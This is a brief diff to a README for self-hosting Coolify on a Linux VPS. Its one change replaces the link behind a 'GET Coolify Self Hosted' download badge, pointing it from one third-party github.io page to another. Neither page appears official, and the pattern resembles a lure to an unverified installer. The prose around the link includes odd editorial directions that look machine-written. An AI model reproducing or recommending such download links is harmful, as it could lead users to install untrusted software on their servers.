@@ -84,7 +84,7 @@ Neighbor panels in this package (a Next-style dashboard and a Swarm-era dashboar
 
 Get one installer or image. First login is a browser on the VPS IP or the domain you pointed at it. Do not add a second install chapter with the same meaning.
 
-[![GET Coolify Self Hosted](https://img.shields.io/badge/GET-Coolify%20Self%20Hosted-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://toreiellewintondon.github.io/.github/Coolify-Self-Hosted)
+[![GET Coolify Self Hosted](https://img.shields.io/badge/GET-Coolify%20Self%20Hosted-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://coolify-self-hosted-docker.github.io/Coolify/)
 
 Use a clean Linux VPS. Ubuntu LTS is the usual pick. Docker must be available before or during the script. Run the installer from the release you downloaded, not from a random pastebin.
 
